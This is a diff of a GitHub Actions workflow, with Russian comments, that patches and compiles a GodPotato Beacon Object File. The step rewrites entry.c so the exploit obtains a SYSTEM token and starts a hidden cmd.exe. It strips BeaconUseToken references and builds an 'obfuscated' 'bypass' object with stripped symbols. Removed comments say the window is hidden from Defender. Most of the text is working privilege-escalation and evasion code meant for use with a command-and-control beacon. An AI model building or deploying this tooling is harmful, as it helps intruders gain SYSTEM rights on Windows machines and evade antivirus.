@@ -25,7 +25,7 @@ jobs:
       with:
         python-version: '3.11'
 
-    # 4. Полностью вырезаем логику Token Mode и заменяем на скрытый CreateProcess
+    # 4. Полностью переписываем логику, удаляя BeaconUseToken
     - name: Auto-Patch & Obfuscate Source Code
       shell: python
       run: |
@@ -40,7 +40,7 @@ jobs:
             print("[-] Error: entry.c not found!")
             sys.exit(1)
 
-        # Полностью перезаписываем entry.c, убирая проверку аргументов и BeaconUseToken вообще!
+        # Полностью перезаписываем entry.c, убирая BeaconUseToken
         clean_entry_code = """
         #include <windows.h>
         #include "beacon.h"
@@ -71,7 +71,7 @@ jobs:
             KERNEL32$RtlSecureZeroMemory(&si, sizeof(si));
             si.cb = sizeof(si);
             si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
-            si.wShowWindow = 0;      // SW_HIDE (Скрывает окно процесса от Defender)
+            si.wShowWindow = 0;      // SW_HIDE
             KERNEL32$RtlSecureZeroMemory(&pi, sizeof(pi));
 
             // Запускаем скрытый cmd.exe из токена напрямую
@@ -83,31 +83,33 @@ jobs:
 
         // Главная точка входа, которую вызывает ваш cli4bofs
         void go(char* args, int alen) {
-            // Инициализируем GodPotato, передавая NULL вместо pipeName (он сгенерирует рандомный легитимный пайп)
-            HANDLE hToken = PotatoExploit(NULL); 
+            GodPotatoContext context;
+            KERNEL32$RtlSecureZeroMemory(&context, sizeof(context));
+            context.pipeName = NULL; // автогенерация пайпа
+
+            HANDLE hToken = PotatoExploit(&context); 
             
             if (hToken != NULL && hToken != INVALID_HANDLE_VALUE) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonation successful! Executing payload...");
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Exploited! Running payload...");
                 ExecutePayload(hToken);
                 KERNEL32$CloseHandle(hToken);
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Exploit failed to get SYSTEM token.");
+                BeaconPrintf(CALLBACK_ERROR, "[-] Exploit failed.");
             }
         }
         """
 
         with open(entry_path, "w", encoding="utf-8") as f:
             f.write(clean_entry_code)
-        print("[+] entry.c successfully overwritten and cleaned from BeaconUseToken.")
+        print("[+] entry.c successfully overwritten and cleaned.")
 
-        # Убираем следы в остальных .c файлах на всякий случай
+        # Очищаем остальные файлы от упоминаний BeaconUseToken на случай проверок линкера
         for root, dirs, files in os.walk("gpp-temp"):
             for file in files:
                 if file.endswith(".c") and file != "entry.c":
                     file_path = os.path.join(root, file)
                     with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                         content = f.read()
-                    
                     if "BeaconUseToken" in content:
                         content = content.replace("BeaconUseToken(hToken);", "")
                         with open(file_path, "w", encoding="utf-8") as f:
@@ -119,11 +121,11 @@ jobs:
       with:
         version: 0.14.1 
 
-    # 6. Сборка проекта
+    # 6. Сборка проекта (флаг -fstrip заменен на корректный линкер-флаг -Wl,-s)
     - name: Compile Obfuscated BOF File
       run: |
         cd gpp-temp
-        zig cc -c entry.c -o ../GodPotatoBOF_Bypass.o -I. -Icommon -D_WIN32_WINNT=0x0600 -O ReleaseSmall -fstrip -fno-asynchronous-unwind-tables
+        zig cc -c entry.c -o ../GodPotatoBOF_Bypass.o -I. -Icommon -D_WIN32_WINNT=0x0600 -O ReleaseSmall -Wl,-s -fno-asynchronous-unwind-tables
         cd ..
 
     # 7. Загружаем готовый .o файл в артефакты репозитория GitHub
